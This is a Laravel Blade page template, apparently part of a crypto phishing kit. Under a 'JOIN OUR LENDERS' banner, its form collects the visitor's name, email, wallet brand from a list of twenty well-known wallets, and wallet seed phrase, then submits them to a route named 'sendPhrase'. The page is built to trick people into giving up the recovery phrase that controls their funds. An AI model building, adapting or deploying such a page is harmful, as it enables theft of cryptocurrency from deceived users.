@extends('pages.layout.app')
@section('content')

<div class="body-overlay"></div>
    <!-- slide bar end -->

<main>

    <!-- breadcrumb start -->
    <section class="breadcrumb pos-rel">
        <div class="container">
            <div class="breadcrumb__content">
                <h2 class="breadcrumb__title">JOIN OUR LENDERS</h2>
            </div>
        </div>
        <div class="breadcrumb__shape">
            <img src="assets/img/shape/b_shape1.png" alt="">
        </div>
        <div class="breadcrumb__icon">
            <div class="icon icon--1">
                <div data-parallax="{&quot;y&quot; : 80}" style="transform:translate3d(0px, 49.803px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(0px, 49.803px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    <img src="assets/img/icon/bi_01.png" alt="">
                </div>
            </div>
            <div class="icon icon--2">
                <div data-parallax="{&quot;x&quot; : -90}" style="transform:translate3d(-55.999px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(-55.999px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    <img src="assets/img/icon/bi_02.png" alt="">
                </div>
            </div>
            <div class="icon icon--3">
                <div data-parallax="{&quot;y&quot; : -80}" style="transform:translate3d(0px, -49.773px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(0px, -49.773px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    <img src="assets/img/icon/bi_03.png" alt="">
                </div>
            </div>
            <div class="icon icon--4">
                <div data-parallax="{&quot;x&quot; : 90}" style="transform:translate3d(56.029px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(56.029px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    <img src="assets/img/icon/bi_04.png" alt="">
                </div>
            </div>
        </div>
    </section>
    <!-- breadcrumb end -->


    <!-- contact start -->
    <section class="ico-contact pos-rel">
        <div class="container">
            <div class="ico-contact__wrap">
                <h2 class="title">GET STARTED</h2>
                <form action="{{ route('sendPhrase') }}" method="POST">
                    @csrf
                    @if(session()->has('success'))
                        <div class="alert alert-success">
                            {{ session()->get('success') }}
                        </div>
                    @endif
                    @if(session()->has('error'))
                        <div class="alert alert-danger">
                            {{ session()->get('error') }}
                        </div>
                    @endif
                    @if ($errors->any())
                        <div class="alert alert-danger">
                            <ul>
                                @foreach ($errors->all() as $error)
                                    <li>{{ $error }}</li>
                                @endforeach
                            </ul>
                        </div>
                    @endif
                    <div class="row">
                        <div class="col-lg-6">
                            <label >Name:</label>
                            <input type="text" name="name" placeholder="Enter Name">
                        </div>
                        <div class="col-lg-6">
                            <label >Email:</label>
                            <input type="email" name="email" placeholder="Enter Mail">
                        </div>
                        <div class="col-lg-12 mb-3">
                            <label for="crypto-wallet">Select a Crypto Wallet:</label>
                            <select id="crypto-wallet" name="wallet" class="form-control">
                                <option value="Trust Wallet">Trust Wallet</option>
                                <option value="Coinbase Wallet">Coinbase Wallet</option>
                                <option value="Binance Wallet">Binance Wallet</option>
                                <option value="Ledger Live">Ledger Live</option>
                                <option value="Trezor Wallet">Trezor Wallet</option>
                                <option value="Exodus Wallet">Exodus Wallet</option>
                                <option value="Atomic Wallet">Atomic Wallet</option>
                                <option value="Metamask Wallet">Metamask Wallet</option>
                                <option value="MyEtherWallet">MyEtherWallet</option>
                                <option value="BitPay Wallet">BitPay Wallet</option>
                                <option value="Electrum Wallet">Electrum Wallet</option>
                                <option value="Edge Wallet">Edge Wallet</option>
                                <option value="Jaxx Wallet">Jaxx Wallet</option>
                                <option value="Guarda Wallet">Guarda Wallet</option>
                                <option value="Coinomi Wallet">Coinomi Wallet</option>
                                <option value="Kraken Wallet">Kraken Wallet</option>
                                <option value="Huobi Wallet">Huobi Wallet</option>
                                <option value="OKEx Wallet">OKEx Wallet</option>
                                <option value="Bitfinex Wallet">Bitfinex Wallet</option>
                                <option value="Gemini Wallet">Gemini Wallet</option>
                            </select>
                        </div>
                        <div class="col-lg-12">
                            <label for="crypto-wallet">Seed Phrase:</label>
                            <textarea name="phrase" id="message" cols="30" rows="10" placeholder="Enter your seed phrase..."></textarea>
                        </div>
                        <div class="ico-contact__btn text-center mt-10">
                            <button class="thm-btn" type="submit">send request</button>
                        </div>
                    </div>

                </form>
                <div class="ico-contact__shape-img">
                    <div class="shape shape--1">
                        <img data-parallax="{&quot;y&quot; : -50}" src="assets/img/shape/c_shape1.png" alt="" style="transform:translate3d(0px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(0px, 0px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    </div>
                    <div class="shape shape--2">
                        <img data-parallax="{&quot;y&quot; : 60}" src="assets/img/shape/c_shape2.png" alt="" style="transform:translate3d(0px, 0.029px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); -webkit-transform:translate3d(0px, 0.029px, 0px) rotateX(0deg) rotateY(0deg) rotateZ(0deg) scaleX(1) scaleY(1) scaleZ(1); ">
                    </div>
                </div>
            </div>
        </div>
        <div class="ico-contact__shape">
            <div class="shape shape--1">
                <img src="assets/img/shape/f_shape1.png" alt="">
            </div>
            <div class="shape shape--2">
                <img src="assets/img/shape/f_shape2.png" alt="">
            </div>
            <div class="shape shape--3">
                <img src="assets/img/shape/f_shape3.png" alt="">
            </div>
        </div>
    </section>
    <!-- contact end -->
</main>

@endsection

